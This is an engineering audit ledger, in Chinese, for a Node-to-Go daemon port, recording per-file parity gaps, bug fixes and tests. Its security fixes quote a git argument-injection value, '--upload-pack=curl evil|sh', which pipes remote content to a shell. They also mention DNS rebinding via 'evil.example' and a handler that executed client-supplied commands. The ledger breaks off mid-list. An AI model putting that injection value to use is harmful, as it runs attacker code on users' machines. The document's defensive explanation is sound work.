# Node → Go 逐文件审计台账

对应 Issue：`2026-10-20-o-line-by-line-node-audit.md`

结论口径：`PORTED`（有等价实现）/ `PARTIAL`（有但缺分支）/ `MISSING`（没有）/ `DROPPED`（决定不做）/ `N/A`（无运行时行为）。
每条都写证据位置，不带证据的结论视为未审计。

---

## 批次 1 · `archive/packages/server/src/server/` 顶层（76 文件）

### 已审计

| 文件                                 | 行数 | 结论               | 证据 / 缺口                                                                                                                                                                                                                                                                                              |
| ------------------------------------ | ---- | ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `service-proxy.ts`                   | 1039 | **MISSING**        | Go 无 HTTP/WS 反代。需要：脚本端口注册表、`<script>--<workspace>.<baseDomain>` 主机名路由、本地/公网 URL 投影、health 探测。`internal/relay` 只有 E2EE 中继，不是这个。                                                                                                                                  |
| `script-health-monitor.ts`           | 229  | **MISSING**        | 依赖 service-proxy，用于探测脚本存活并回调。Go 无对应。                                                                                                                                                                                                                                                  |
| `workspace-service-port-registry.ts` | —    | **MISSING**        | 脚本端口分配/回收。`workspace.script.start` 现在直接跑命令，不分配端口。                                                                                                                                                                                                                                 |
| `workspace-setup-runtime.ts`         | —    | **PARTIAL**        | Go 有 `internal/server/ws_plugin_setup.go` 跑 `byspace.json` 的 setup，但缺：阶段划分、`blocked` 状态与 `blockedSource`、change-request 门禁、`workspace_setup_progress` 的 `truncated` 之外的字段。                                                                                                     |
| `daemon-config-store.ts`             | 1199 | **PARTIAL**        | Go `store.LoadDaemonConfig/SaveDaemonConfig` 读写嵌套 `{version,daemon:{...}}`；缺 `agentProfiles` 增删改查、`providers` 的 profiled 配置校验、迁移路径。                                                                                                                                                |
| `session.ts`                         | 7773 | **PARTIAL**        | 158 个消息 case 全部路由（协议 171 条入站全覆盖），但深度不一。详见下方「session.ts 逐 case」。                                                                                                                                                                                                          |
| `websocket-server.ts`                | 2771 | **PARTIAL** → 已补 | 连接生命周期。审计发现并修复：hello 超时（Node 15s/4001，Go 原本没有，半开连接会永久占坑）、shutdown 广播（Node 发 1001，Go 没有，重启时客户端只看到静默断开）、close code 数值对齐（Go 用 4400/4402，Node 用 4003/4002）。仍缺：外部会话 90s 宽限期重连（`externalSessionsByKey`）、运行指标 30s 刷写。 |

### session.ts 已确认的实现缺口

| Case                          | Node 行为                              | Go 现状                                                     |
| ----------------------------- | -------------------------------------- | ----------------------------------------------------------- |
| `workspace.script.start/stop` | 分配端口、注册 proxy 路由、健康探测    | 直接 `/bin/sh -lc` 跑命令，无端口/proxy（见 service-proxy） |
| `workspace.setup.run`         | 阶段化执行 + blocked 判定              | 逐条执行 + 日志，无 blocked                                 |
| `agent.skills.*`              | SHA-256 比对 + 事务写入 + 回滚         | 只读扫描 + 三态判断，无 add/update/delete                   |
| `agent.rewind`                | 文件快照回滚（conversation/code/both） | 返回 `ok:true` 占位                                         |
| `provider.usage.list`         | 8 家厂商真实抓取                       | 返回空数组                                                  |
| `hub.*`                       | Hub 远控                               | `not_connected` 占位                                        |

| `workspace-git-service.ts` | 3601 | **PARTIAL** → 已补推送 | Go 有 `internal/workspace/git.go` 的读侧（status/diff/commits/forge）与 `runtime_services.go` 的文件+diff 订阅，但**从不广播 `workspace_update` / `checkout_status_update`**。前端 `workspace-directory-reconciliation.ts` 与 `session-context.tsx` 都在监听这两个消息，收不到就只在全量拉取时才更新。已补：工作区增/改/归档、worktree 创建、git 状态变化时主动推送。仍缺：观察目标的重连自愈相位、LRU 缓存层、并发限流。 |

### 工具盲区（本轮发现并修掉）

`go-emit-parity.mjs` 对 `payload: z.discriminatedUnion(...)` 的消息标为 opaque 后**整条跳过**，
于是 `workspace_update` 这种「payload 是联合体」的消息即使从未发送也不会被报出来。
已改为：opaque 只跳过**字段**比对，仍然检查**是否发送过**。补上后立刻暴露 4 条 NEVER_SENT。

同时修掉解析器的两个盲区：

- 标识符参数（`sendSessionMsg(..., respType, ...)`）被 `slice(1,-1)` 切成 `espTy`，导致所有 `respType` 派生的响应都识别不到
- 同一分支内 `if` 二次赋值 `respType` 时只认第一个（`github_search_response` 被误报）；顺手把该处代码改成两个显式调用，静态可见

| `bootstrap.ts` | 1883 | **PARTIAL** → 已补 | 启动流程。已补：`BYSPACE_LISTEN` 支持 unix socket / named pipe（Node 支持 6 种形式，Go 只做 TCP）、启动时清理废弃的 `agent-timelines` 目录。仍缺：managed helper process 台账对账（`reapStale`）、启动时 skills 维护、`terminalProfiles`/`agentProfiles` 从启动参数注入、trustedProxies。 |

| `worktree-bootstrap.ts` | 1101 | **PARTIAL** → 已补核心 | **创建工作区/worktree 后从不跑 setup**——`setupTerminalId` 恒为 nil，`byspace.json` 的 setup 命令在新 worktree 里永远不执行，导致「新建的 worktree 看起来就绪，但第一条命令就失败」。已补：`workspace.create` 与 `create_byspace_worktree` 都异步启动 setup 并流式上报进度；无 setup 命令时在 `setupSkippedReason` 里说明。测试 `TestWorkspaceCreateRunsSetup` / `TestWorkspaceCreateReportsSkippedSetup`。仍缺：`runtimeEnv` 解析（worktree 专属环境变量注入终端）、失败时清理、`runWorktreeAutoTerminals`、脚本生命周期的 port/proxy 部分。 |
| `worktree-session.ts` | 929 | **PARTIAL** | worktree 会话级操作大多走 `internal/workspace/git.go`；缺自动终端与脚本 teardown。 |

| `workspace-archive-service.ts` | 643 | **PARTIAL** → 已补核心 | **归档工作区时不停它的 agent、不关它的终端**——只把工作区记录的 `archivedAt` 翻了一下。归档掉的 agent 仍在跑并继续消耗 token，PTY 也一直占着。已补 `archiveWorkspaceContents`：关闭该工作区的全部 agent 运行时、杀掉其终端、归档 agent 记录并广播。测试 `TestArchiveWorkspaceStopsItsAgents`（已验证移除修复即失败）。仍缺：按引用计数判断目录是否可删（`isDirectoryUnreferenced`）、`archiveByScope` 的批量语义。 |

| `agent-history-search.ts` | 188 | **MISSING** → 已补 | 历史搜索是**分词 + 六级 tier + 字段优先级**的相关性排序（workspace > title > branch > project，每 token 必须命中，可跨字段）。Go 只有「标题/cwd/ID 子串包含」——多词查询搜不到、无相关性排序、无法与多主机分页结果合并。已按 Node 重写：`internal/server/history_search.go` + `match.TokenizeQuery`，`filterAndSortAgents` 改为走它。4 个测试覆盖跨字段、排序、容错、空查询。 |
| `resolve-workspace-id-for-path.ts` | 46 | **MISSING** → 已补 | 按路径解析工作区：精确匹配优先，否则**最深**的包含工作区，且**永不匹配 home 目录**（否则吞掉所有路径）。Go 只有精确字符串比较，传 worktree 子目录时找不到。已补 `store.ResolveWorkspaceIDForPath` + 5 个断言。 |
| `persisted-config.ts` | 521 | **PARTIAL** | Go 读写 `{version,daemon:{...}}` 结构已对齐；缺 schema 校验与迁移路径。 |

| `checkout-diff-manager.ts` | 413 | **MISSING** → 已补 | **文件订阅与 diff 订阅的轮询从未启动**：`PollSubscriptionsOnce` 只有测试里手动调用过，`New()` 里没有任何 goroutine 驱动它。于是「编辑器里订阅了文件」和「diff 面板订阅了变更」在真实运行中**永远收不到推送**。已补 `startSubscriptionPoller`（1s 周期），`Close()` 时停止。测试 `TestFileSubscriptionFiresWithoutManualPoll`（已验证移除轮询即失败）。差异：Node 用文件系统 watcher + 150ms 防抖，Go 用 1s 轮询——更省依赖，延迟略高。 |

| `workspace-script-runtime-store.ts` | — | **MISSING** → 已修字段 | 脚本 payload 的**字段名全错**：协议要 `scriptName`/`type`/`hostname`/`port`/`lifecycle`(running\|stopped)/`health`，Go 发的是 `name`/`command`/`status`。整个 `workspace.script.start.response` 与 `script_status_update` 客户端校验失败，脚本面板什么都不显示。已按 schema 重写并加测试。仍缺：端口分配与 proxy 路由（见 service-proxy）。 |
| `daemon-config-store.ts` | 1199 | **PORTED** | `agentProfiles` 经 `set_daemon_config` 透传即可；前端选择器把 profile 展开成具体 provider/model/mode，daemon 只存不解释。 |

| `pid-lock.ts` | 364 | **PARTIAL** → 已补 | Node 的锁是 JSON（pid/startedAt/hostname/uid/listen/heartbeat）+ 30s 心跳 + **5 分钟陈旧回收**。Go 只写裸 PID：崩溃后 pid 被无关进程复用时，`IsStale` 无从判断，锁会一直挡住重启。已补 `PIDLockInfo`/`ReadPIDLock`/`IsStale`/`TouchPIDLock`，`serve` 启动时检查并拒绝重复实例，30s 心跳；旧格式（裸整数）仍可读。4 个测试覆盖往返、旧格式、死 pid、过期心跳。 |

| `config.ts` | 812 | **PARTIAL** → 已补安全项 | Node 支持 30 个环境变量，Go 缺关键几个。已补：**Host 白名单**（`BYSPACE_HOSTNAMES`/`BYSPACE_ALLOWED_HOSTS` + `config.daemon.hostnames`），挡 DNS rebinding —— 绑定 loopback 的 daemon 仍可被 `evil.example` 解析到 127.0.0.1 后访问，Host 头是唯一信号。实测伪造 Host 返回 403，`127.0.0.1`/`localhost`/机器名正常。仍缺：`BYSPACE_PASSWORD` 密码鉴权、`BYSPACE_TRUSTED_PROXIES`、git 并发限流、`BYSPACE_LOG_*` 日志级别、relay TLS 覆盖。 |
| `home-workspace.ts` | 391 | **PARTIAL** → 已补 | Node **每次启动都重新断言** Home 的展示属性；Go 发现已存在就 `return nil`。label 一旦丢失（手改、旧版本、合并出错），Chief 就不再置顶、还多出 `+` 按钮。已补：按 cwd 重新打标而非新建重复记录，用户自设标题保留。2 个测试。 |
| `web-ui.ts` | 271 | **PORTED** | gzip/br 内容协商、SPA 回退、连接提示注入、缓存头均已对齐。 |
| `tunnel-manager.ts` | 567 | **MISSING** | 完整 TCP 端口转发子系统（每端口一个 listener + relay 流复用 + 断连宽限）。Go 的 `tunnel.*` 只是 `not_connected` 占位。**暂不实现**：验证需要两台机器，owner 明确说当前不具备条件，盲写风险高于收益。 |

| `relay-transport.ts` | 554 | **PARTIAL** → 已补 | 缺两件事：**keepalive**（Node 每 10s ping，30s 无应答即判定 half-open 并强制重连——否则中继悄悄消失时 `Read` 永不返回、`Close` 永不到达，daemon 以为自己还连着而手机一直超时）、**退避**（Node 线性退避到 30s，Go 固定 2s 会一直捶一个挂掉的中继）。均已补。 |
| `workspace-registry.ts` | 714 | **PORTED** | 记录投影与命名规则（title 优先、否则 displayName）已在 `buildWorkspaceDescriptor` 与 `buildProjectDescriptor` 对齐。 |
| `workspace-directory.ts` | 721 | **PARTIAL** → 已补 | `resolveWorkspaceRootAgent` 缺失：子代理会话应归组到发起对话的根 agent，跨工作区时停在边界，遇环返回 nil。已补 `internal/server/agent_tree.go` + 4 测试。同时修正 parent 关系的存储位置——共享词表用 label `byspace.parent-agent-id`，Go 原本存在私有字段里。 |

| `ws_git_system.go` / `pi/rewind` | — | **MISSING** → 已补 | `agent.rewind` 之前只是把内存 timeline 截断：provider 完全不知道，下次水合就把旧分支恢复回来。已按 Node 实现：生成 pi 集成扩展（`internal/agent/pi/extension.go`，移植自 `createPiBySpaceExtensionFile`），提供 entry capture（把用户消息映射到 pi 的树条目 id）与 tree navigation（`byspace_tree` 命令调用 `ctx.navigateTree`）。`agent.rewind.request` 现在走真实 provider 导航，失败会返回错误而不是假成功。 |
| `server.go` listen | — | **MISSING** → 已补 | daemon 只绑一个 loopback 族：前端把 `127.0.0.1` 归一成 `localhost` 后浏览器可能解析到 `::1`，连接超时并表现为「未连接主机」。已补双栈绑定（`listen_dual.go`），`127.0.0.1`/`localhost`/`[::1]` 三种地址实测均可连。 |
| `hostnames.ts` | — | **已修正实现** | 我最初把 Host 白名单加在 `ServeHTTP` 上，拦掉了静态资源和 API，导致整个前端「未连接」。Node 只在 **WebSocket 升级**时校验（`websocket-server.ts:737`），并且未配置白名单时默认不限制。已改到 `handleDirectWS`，默认放行。 |

| `daemon-config-store.ts` | 1199 | **PARTIAL** → 已补核心 | `daemon.config.reload` 之前返回三个空数组：settings 页无法区分「已生效」「需要重启」「环境变量接管，你的修改被忽略」。已补 `config_reload.go`（移植 RELOADABLE_PATHS 25 条 + 环境变量归属表 + 前缀匹配 + JSON 值比较），并真的清掉 CORS / hostnames 缓存。端到端验证：改 `appendSystemPrompt` 后正确归入 `appliedPaths`。仍缺：brcf 密码哈希写入、provider 增删的事务回滚、`onFieldChange` 热应用（relay 重连、tunnel 重配）。 |

| `worktree-session.ts` | 929 | **PARTIAL** → 已补安全项 | `normalizeGitOptions` 的取值逻辑（worktreeName → gitOptions 的推导、slug 归一）Go 已在 handler 里做，但 **`assertSafeGitRef` 完全缺失**。`CreateWorktree` / `SwitchBranch` / `RenameBranch` / `Merge` 都把客户端字符串直接拼进 git 参数；git 会把 `-` 开头的值当选项，`--upload-pack=curl evil\|sh` 在 fetch 时就执行。已补 `AssertSafeGitRef`（字符集 + 首字符 + `..`/`@{`）与 `AssertSafeWorktreeSlug`（路径穿越），4 个测试覆盖注入与穿越，真实 worktree 创建仍正常。仍缺：`createBySpaceWorktreeWorkflow` 的 pr-number→checkoutSource 兼容层、`runWorktreeSetupInBackground` 的 runtimeEnv 注入。 |

| `workspace-reconciliation-service.ts` | 542 | **MISSING** → 已补 | 没有任何「定时从磁盘重新读取 git 事实」的机制：在终端里切分支后侧边栏一直显示旧分支，一个原本是普通目录的工作区后来变成 git 仓库也永远还是 `directory`。已补 `workspace_placement.go`（移植 `reconcileWorkspacePlacement`，只改真正变化的字段；已稳定的记录不重复写，避免每 5 分钟把 `updatedAt` 刷一遍并广播一堆无意义 update），并挂到 5 分钟定时器上（对应 Node 的 `DEFAULT_RESCAN_INTERVAL_MS`）。 |

| `agent/agent-loading.ts` | 148 | **PARTIAL** → 已补 | 三个缺陷：① **并发冷启动不去重**——两个请求同时到达都看到「未加载」，各起一个 provider 进程，输的那个变成孤儿并继续占着会话文件；② **不检查归档状态**——归档的 agent 仍可被 resume，等于复活用户已经删掉的会话并继续烧 token；③ **不校验 provider 是否已注册**——记录指向本构建不认识的 provider 时，报的是 exec 失败而不是「你缺少这个 provider」。均已补，3 个测试；去重测试已验证移除修复即失败（`concurrent loads produced more than one session`）。 |

| `agent/agent-projections.ts` | 521 | **PARTIAL** → 已补 | `toAgentPayload` 有 `runtimeInfo` 与 `lastError`，Go 都没发。前者是 provider 实际使用的模型（可能被压制成支持的档位，与配置不同），composer 用它显示实时选择；后者是 agent 页的 `lastHostError`，缺了只会显示泛化的「出错了」。补的时候踩了一次：两者在 schema 里是 **optional 而非 nullable**，发 `null` 会让整个 `fetch_agents_response` 校验失败——已改成有值才加。 |

### 审计工具补了一项：optional 字段禁止发 null

`go-emit-parity.mjs` 只查「发没发」，不查「发的是不是 null」。而 protocol 里的功能字段大多是
`optional` 而非 `nullable`，发 `null` 会让**整条响应**失效——比不发更糟，前端拿到的是零数据。
这类错误我犯过两次（`projectIconRevision`、`runtimeInfo`），都是提交后才在浏览器里发现。

新增 `NULLED_OPTIONAL` 检查，首跑就抓出 7 处：`tunnel.*.error`、`create_byspace_worktree_response`
的 `errorCode`/`setupSkippedReason`、`providers_snapshot_update.cwd`、
`hub.management.daemon.disconnect.response.warning`。全部改为「有值才添加」，并新增
`CONDITIONALLY_OMITTED` 显式记录哪些字段是条件省略（每条写明条件），避免检查器把合法省略当成漏发。

同时修了它自己的两个盲区：成员集合为空时整个审计会静默通过（现在退化为扫「所有带 type 字面量的
schema」）；`payloadText` 只截到分号，导致嵌套 key 的 null 检查失效。

接入 CI（`Validate CI contracts`）并补 3 个测试。

### 入站字段缺口：从 47 清到 42（本轮）

`terminal_input` 是**真正的功能缺陷**：协议形状是 `{terminalId, message: {type, data}}`，
Go 读的是顶层 `data`，于是 JSON 路径的按键、resize、鼠标事件全部静默丢弃（打字之所以还能用，
是因为客户端优先走二进制帧）。已按协议解析 `input`/`resize`/`mouse`，并保留扁平 `data`
作为旧 bundle 的兼容。端到端验证：发嵌套 `{type:"input", data:"echo NESTED_OK\r"}` 后
`capture_terminal` 能读到 `NESTED_OK`。

`terminal.rename.request` 完全没有解析请求体，返回成功但标题不变——已补。

`fetch_agent_timeline_request.limit` 被忽略，翻页客户端每次都拿整段历史——已按窗口截断。

`create_terminal_request.agentId` 未解析，开终端时回落到 daemon 的 cwd 而不是该 agent 的工作目录
——已补（优先 agent.cwd，其次 workspace.cwd）。

### 入站字段名不一致：4 处功能直接失效

协议字段名和我写的 struct tag 不一样时，`json.Unmarshal` 不报错、字段为空，功能静默不生效。
本轮抓到的：

| 消息                                | 我写的    | 协议          | 后果                                       |
| ----------------------------------- | --------- | ------------- | ------------------------------------------ |
| `checkout.rename_branch.request`    | `newName` | `branch`      | 重命名成空字符串，必然失败                 |
| `stash_save_request`                | `message` | `branch`      | stash 没有标签，还原时无法识别             |
| `checkout_pr_create_request`        | `base`    | `baseRef`     | PR 总是打到仓库默认分支                    |
| `checkout.*.set_auto_merge.request` | 未解析    | `mergeMethod` | 硬编码 `--merge`，squash-only 仓库必然被拒 |

另外两处更严重：

- **`open_in_editor_request` 直接 `exec.Command(req.EditorID)`** —— `editorId` 来自客户端，
  等于把任意字符串当命令执行。改为白名单 + `LookPath` 校验，列表接口用同一份白名单。
- `terminal_input` 的嵌套形状（见上一条）。

### 入站缺口 34 → 32：写配置的乐观锁 + 工作区列表的筛选排序分页

- **`write_project_config_request.expectedRevision` 被忽略**：编辑器持有的 revision 没有比对，
  两个打开的编辑器会互相覆盖、静默丢改动。已按协议实现：不匹配返回
  `{code: "stale_project_config", currentRevision}`（`ProjectConfigRpcErrorSchema` 是
  discriminated union，不能自己造 `errorCode`），失败分支也只允许 `{requestId, repoRoot, ok, error}`。
  端到端验证：错误 revision 被拒且响应通过协议校验。
- **`fetch_workspaces_request` 的 filter/sort/page 全被忽略**：侧边栏搜索框无效、排序不生效、
  大列表一次全量下发。已实现 `filterSortPageWorkspaces`（query 匹配名称/分支/项目名、
  projectId 过滤、4 种排序键含 `status_priority`、cursor 分页），4 个测试。

### 终端订阅泄漏（真 bug）

`Session.Subscribe` 返回 `unsubscribe` 函数，Go 侧两处调用都把它丢掉了；`unsubscribe_terminal_request`
的 handler 直接 `return`。后果：

- 对同一 terminal 重复 subscribe（重连时很常见）会让输出推送**成倍放大**
- 关闭的 socket 仍然持续收到二进制帧
- 客户端主动取消订阅完全无效

已补 per-sink 订阅表（`terminalUnsubscribers`），支持按 terminal 取消与整个 socket 拆除时清理，
两个测试；端到端验证「订阅两次 → 取消 → 不再收帧」。

### `terminal/**`：shell 检测、输出合并、尺寸归属

| 文件                           | 结论               | 说明                                                                                                                                                                                                                                                                   |
| ------------------------------ | ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `shell-detect.ts`              | **MISSING** → 已补 | Go 只返回 `$SHELL` 一项，选择器看起来「只装了一个 shell」。已移植完整发现顺序（env → macOS 登录 shell → `/etc/shells` → 常见路径），只返回存在的。本机实测 **7 个**（zsh/bash/csh/dash/ksh/sh/tcsh）。PTY 也改用同一解析，避免「Auto 显示的」与「实际 spawn 的」漂移。 |
| `terminal-output-coalescer.ts` | **MISSING** → 已补 | 每次 PTY read 都发一帧；大量小写入的命令（构建日志、`yes`）让客户端把时间花在帧开销上。已加前导沿 + 5ms 窗口，交互回显仍是立即的。实测 1647 字节 / 13 帧，无丢字节。                                                                                                   |
| `terminal-size-ownership.ts`   | **MISSING** → 已补 | 两个客户端看同一终端时，后 resize 的赢：手机上打开会话会把桌面 shell 压成手机宽度、整段换行错乱。已按 claim/update 语义实现归属，缺省 intent 视为 claim（老客户端行为）。                                                                                              |

| `terminal-restore.ts` | **MISSING** → 已补 | `subscribe_terminal_request.restore` 的三种模式完全没处理，每次重连都同时发快照 + 全量重放。已实现 `planTerminalRestore`：`live` 只重放字节（最省）、`visible-snapshot` 限定 scrollback 行数（默认 200，上限 1000）、`full-snapshot` 全量。并给 VTGrid 加了 `SnapshotWithScrollback`。 |

| `agent/agent-manager.ts` | 5496 | **PARTIAL** → 已补两处 | ① **归档父 agent 不级联**：`cascadeArchiveChildren` 缺失，归档一个会话后它派生的子 agent 继续跑、继续烧 token。已实现，含 `shouldDetachFromArchivedParent` 语义——跨工作区的、或用户已打开 tab 的子 agent 应**脱离父级**而不是被归档（归档等于删掉用户还在看的东西）。② **关闭时不取消等待者**：`prepareAgentForClosure` 会给所有 waiter 发 `turn_canceled`，Go 没有，导致 `wait_for_finish` / `byspace wait` 在 agent 已消失后仍挂到自己的超时。已补：`Session.Close` 唤醒所有 waiter，归档路径广播 `turn_canceled`。3 个测试。 |

| `services/quota-fetcher/**` | 4221 | **PARTIAL** → 框架 + 2 家 | `provider.usage.list` 之前硬编码返回空数组，Usage 页看起来是「你没有额度」而不是「这个构建读不到」。已建 `internal/quota`（统一 `Usage`/`Window`/`Balance` 形状、15s 超时、body 上限、tone 阈值），并实现 **codex**（读 `~/.codex/auth.json`，只读不刷新——刷新归 CLI 管，两个 daemon 轮换同一 token 会把用户登出）与 **zai**（`ZAI_API_KEY`/`GLM_API_KEY`）。缺失凭据时返回 `unavailable` 而不是 `error`，两种情况对用户意味着不同的事。6 个测试 + 端到端验证响应通过协议校验。**仍缺 6 家**：claude（keychain，480 行）、cursor、copilot、grok、kimi、minimax——未移植，需真实凭据才能验证。 |

| `agent/agent-prompt.ts` + `agent-timeline-content.ts` | 571 + 85 | **MISSING** → 已补 | ① **系统信封完全没实现**：BySpace 自己注入的 prompt（chat mention、定时触发、完成通知）以 `<byspace-system>…</byspace-system>` 包裹，provider 收到的是普通用户消息，但**不是人说的话**。Go 直接把它们当用户气泡渲染，等于让 transcript 谎报是谁提的需求。已实现 `FormatSystemNotificationPrompt` / `IsSystemInjectedEnvelope`（锚定 + 要求精确换行布局，用户手打标签不会被隐藏），并在 pi 历史重放处过滤。② **timeline 内容无上限**：`limitAgentTimelineItemContent` 缺失，一次 `cat` 大文件或失败构建的输出会随每一行、每次拉取、每次落盘重复传输。已实现 64KB 上限（保留前缀，命令本身不动）。6 个测试。 |

| `agent/agent-run-state.ts` | 313 | **PARTIAL** → 已补键点 | Node 用 run token 让**过期的 settle 事件失效**。Go 直接按 `turnId` 改状态：第二轮 prompt 发出后，第一轮的 `byspace_turn_completed` 若还没处理完，会把新轮次翻成 idle，UI 上「进行中」提前消失。已补 `Session.turnToken`（每轮新铸）与完成事件上的 token 比对，不匹配则丢弃。`ManagedSession` 接口加了 `TurnToken()`，其余 provider 返回空串（回落到 turnId 比较）。 |

| `auth.ts` | 162 | **MISSING** → 已补 | **密码鉴权完全没实现**：配置里能设 `auth.passwordHash`，但 daemon 对所有请求一律放行；`passwordSet` 还硬编码成 false。这意味着设了密码的用户以为有保护，实际任何能连 loopback（或经 relay/tunnel 连进来）的东西都能操作 daemon。已实现 bcrypt(12) 哈希、`Authorization: Bearer`、WebSocket 的 `byspace.bearer.<token>` 子协议、豁免路由表（`/api/health`、`/api/files/download`、`/mcp/agents`）、`/mcp/agents` 的 capability-token 自鉴权、`passwordSet` 由 hash 派生而非存储。端到端验证：无密码 200、有密码无 token 401、错 token 401、对 token 200、health 免鉴权 200、**改配置无需重启即生效**。 |

| `byspace-env.ts` | 92 | **MISSING** → 已补 | `RUNTIME_CONTROL_ENV_KEYS` 的剥离完全没实现。其中 `BYSPACE_PI_TERMINAL_HOOK_OWNER_PID` 是项目记忆里记过的真实故障源：Pi 扩展读到不属于自己的 pid 就认为自己是继承来的子进程，**一个 handler 都不注册**，终端从此永远不上报 running/idle。已实现 `home.ExternalProcessEnv`（overlay 之后再剥离，调用点无法把它塞回来），接到 PTY、agent JSONL 进程、setup 脚本三处 spawn 点。端到端验证：daemon 自身带 `BYSPACE_PI_TERMINAL_HOOK_OWNER_PID=4242` 启动，从它开的终端里 `echo` 出来是空的。4 个测试。 |

| `runtime-mcp-config.ts`（内联在 `providers/pi/agent.ts`） | ~60 | **MISSING** → 已补 | **内置 MCP 桥从未注入**：`byspace mcp-bridge`、`/mcp/agents` 和它背后 37 个工具都实现了，但没有任何东西把它们接到 agent 上——pi 没有 MCP 启动参数，只能通过扩展的 `pi.registerMcpServer` 注册。已在生成的扩展里注入（内置桥自举 `os.Executable()` + 用户配置的 server），并补了 daemon 侧的系统提示注入（`before_agent_start`）。`/mcp/agents` 现在用 per-run capability token 自鉴权。 |

| `resolve-worktree-creation-intent.ts` | 279 | **MISSING** → 已补 | `create_byspace_worktree_request` 的 `action` 与 `checkoutSource` 完全没解析，`refName` 被无条件当作「新分支的起点」，于是「检出已有分支」和「检出这个 PR」都变成了「从它开新分支」——分支名对，工作树内容错。已实现 `ResolveWorktreeIntent`（6 种组合 + 两个具名错误）、`ResolveChangeRequestCheckoutTarget`（gh/glab/tea 三家分别解析 head/base/cross-repo）、`checkoutExistingBranch`、`checkoutChangeRequest`（用 `refs/pull/<n>/head`，跨仓库 PR 也能检出）、`ResolveDefaultBranch`。端到端验证三条路径：branch-off 建 `feat-new`、checkout 检出 `existing-branch`、缺目标返回 `invalid_worktree_intent`。 |

| `worktree-branch-name-generator.ts` | 145 | **MISSING** → 已补 | 没有 slug 时工作区叫 `wt-mabc123`／分支叫 `wt-mabc123`——用户在侧边栏和 `git branch` 里看到这个名字直到任务结束。已实现 `internal/naming`：用短生命周期的 `pi --no-session` 生成标题与分支名（**不用 agent 自己的会话**，否则会往用户正在读的 transcript 里插一轮），返回后做归一化（小写、只留 `[a-z0-9-]`、压缩连字符、100 字符上限、禁止 `-` 开头——模型输出是不可信输入且要进 git 参数）。端到端：中文 prompt「修复登录页在 Safari 上的自动填充失效问题」→ 分支 `fix-safari-login-autofill`。命名失败**不阻断**创建工作区，回落到生成式 slug。4 个测试。 |
| `workspace-auto-name.ts` | 141 | **PARTIAL** | 自动命名已在创建路径上生效（标题 + slug）；仍缺「创建后再命名」与 currentSelection 透传——后者只影响用哪个模型生成，已在 `metadataGeneration.model` 读取。 |

| `workspace-service-env.ts` | 121 | **PARTIAL** → 已补端口部分 | 我原来只注入了 `PORT` / `WORKSPACE_SCRIPT_PORT`。Node 还给脚本一整组互相发现用的变量：`HOST`（按 daemon 绑定地址推导，loopback 就只给 127.0.0.1）、`BYSPACE_PORT`、以及每个兄弟脚本的 `BYSPACE_SERVICE_<NAME>_PORT`。没有这组，一个前端 dev server 无法知道自己后端拿到哪个端口——多工作区并行时必然撞车。已实现（含 env 名归一化与**冲突检测**：`web app` 和 `web-app` 都会变成 `WEB_APP`，两个脚本会互相覆盖）。端到端：`api` 得 60548，`web` 得 60549 且 `BYSPACE_SERVICE_API_PORT=60548`。`BYSPACE_URL` / `..._URL` 仍缺——它们属于未实现的反向代理，发一个指向不存在路由的 URL 比不发更糟。 |

| `project-directory-service.ts` | 215 | **PARTIAL** → 已补 | 三个差异：① 用 `MkdirAll`，`parentPath` 打错一个字就把整条父目录链建出来，而不是报 `parent_directory_not_found`；② 名称校验弱（只查空和路径分隔符），绝对路径、盘符、`..` 都能过；③ 注册失败后**留下的空目录不清理**，却告诉用户失败了。已补 Node 的 `validateDirectoryName` 规则、父目录存在性检查、`permission_denied` 错误码、注册失败回滚。端到端四条路径验证（父不存在 / 绝对路径 / 路径穿越 / 正常），无残留目录。 |
| `logger.ts` | 197 | **PARTIAL（不构成静默失败）** | Node 有完整的日志子系统（级别、格式、文件路径解析、`authorization`/`sec-websocket-protocol` 脱敏）。Go 没有结构化日志，`daemon.log` 只是 `daemon start` 的 stdout/stderr 重定向。**没有引入脱敏是因为没有任何地方记录请求头**——先造一套脱敏机制来防一个不存在的泄漏，等于为了对齐而发明。若将来加请求日志，脱敏必须同时加，`diagnostics` 端点会读这个文件。 |

| `workspace-git-fetch.ts` | 140 | **MISSING** → 已补 | fetch 前后对比 ref 快照，判断远端分支是新增/移动/删除。没有它，pull 后被 prune 的分支仍留在前端的选择器里。已实现 `ReadRefs`/`DiffRefs`/`FetchRemote`（本地 ref 变化单独报告，不与「远端分支变了」混为一谈），接入 `checkout_pull_request`。**顺带修了一个更大的问题**：`runGit` 对所有命令统一 5 秒超时，`git pull`/`fetch` 在真实网络下必然超时并报成 context deadline；现在网络动词 120 秒、本地 10 秒，并强制 `GIT_TERMINAL_PROMPT=0`（否则需要凭据的 fetch 会一直等人回答 prompt）。真实 clone + 上游建分支验证：`origin/<branch>` 被正确报为 added。 |
| `workspace-service-port-allocator.ts` | 129 | **PARTIAL** → 已补 | 只有「任意空闲端口」一种策略。另两种各有非用不可的理由：`portRange` 因为防火墙规则/容器端口映射只允许一个窗口，`portScript` 因为外部服务已经对外声明了端口。已实现 `ParsePortRange`、`AllocateFromRange`（窗口耗尽时报错而不是逃出窗口）、`AllocatePortFromScript`（输出不可信、要进 bind，做了长度与范围校验）。端到端：portRange 得 43000、portScript 得 43500，两个值都真的进了脚本环境。 |

| `relay-runtime.ts` | 106 | **MISSING** → 已补 | relay 只在 CLI 传 `--relay` 时启动，**完全不读 config 的 `daemon.relay.*`**；而 `daemon.config.reload` 把这个路径报成「已应用」——用户去设置页打开 relay，什么都没发生，界面却说生效了。已实现 `relayRuntime`：启动/停止/改地址，**地址没变就不重连**（否则每次保存设置都会把手机上的连接踢掉），退避到 30 秒；启动时读 config、每轮 reload 后应用；`--relay` 作为覆盖优先于 config。端到端：config 改为 enabled 后 reload 正确报 `daemon.relay.enabled`，且 relay 被真正启动。 |
| `worktree-core.ts` | 183 | **PARTIAL** → 已补公共规则 | 核心逻辑（解析 intent + 建 worktree）已在 `worktree_intent.go` 落地。本轮补的是它依赖的 `@bytetrue/protocol/branch-slug`：`slugify`（50 字符、优先在连字符处截断）与 `validateBranchSlug`（长度、`[a-z0-9-/]`、首尾与连续连字符）。客户端在发送前会跑这套规则，daemon 不认同一套就会出现「界面能过、后端拒绝」或反之。 |

### 未审计（本批剩余 28 文件）

按行数排序，下一轮从这里继续：

`websocket-server.ts` 2771 · `bootstrap.ts` 1883 · `workspace-git-service.ts` 3601 ·
